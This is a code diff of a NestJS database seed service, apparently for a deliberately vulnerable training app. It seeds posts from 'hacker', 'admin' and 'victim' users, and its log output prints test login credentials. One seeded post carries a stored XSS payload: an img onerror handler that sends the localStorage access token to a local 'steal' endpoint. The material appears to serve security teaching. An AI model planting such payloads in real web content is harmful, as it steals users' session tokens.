@@ -49,29 +49,26 @@ export class SeedService implements OnModuleInit {
     ]);
 
     // ── 게시글 생성 (XSS 페이로드 포함) ──────────────────────
-    await this.postRepo.save([
-      {
-        title: '초특가 세일! 오늘만 50% 할인!',
-        // ❌ XSS 페이로드: localStorage의 AT를 hacker 서버로 전송
-        content: `<p>지금 바로 확인하세요!</p>
-<img src=x onerror="fetch('http://localhost:4999/steal?t='+localStorage.getItem('at'))">`,
-        author: hacker,
-        authorId: hacker.id,
-      },
-      {
-        title: '일반 공지사항',
-        content: '<p>안녕하세요. 서비스 점검 안내드립니다.</p>',
-        author: admin,
-        authorId: admin.id,
-      },
-      {
-        title: '회원 여러분께 드리는 혜택',
-        content:
-          '<p>포인트 적립 이벤트가 시작되었습니다. 많은 참여 부탁드립니다!</p>',
-        author: victim,
-        authorId: victim.id,
-      },
-    ]);
+    // ❌ V1 XSS 공격용: hacker가 작성한 악성 게시글
+    await this.postRepo.save({
+      title: '초특가 세일! 오늘만 50% 할인!',
+      content:
+        '<p>지금 바로 확인하세요!</p>\n' +
+        '<img src=x onerror="fetch(\'http://localhost:4999/steal?t=\'+localStorage.getItem(\'at\'))">',
+      authorId: hacker.id,
+    });
+
+    await this.postRepo.save({
+      title: '일반 공지사항',
+      content: '<p>안녕하세요. 서비스 점검 안내드립니다.</p>',
+      authorId: admin.id,
+    });
+
+    await this.postRepo.save({
+      title: '회원 여러분께 드리는 혜택',
+      content: '<p>포인트 적립 이벤트가 시작되었습니다. 많은 참여 부탁드립니다!</p>',
+      authorId: victim.id,
+    });
 
     this.logger.log('✅ Seed complete');
     this.logger.log('  victim@test.com  / victim1234 / 1,000,000 pts');
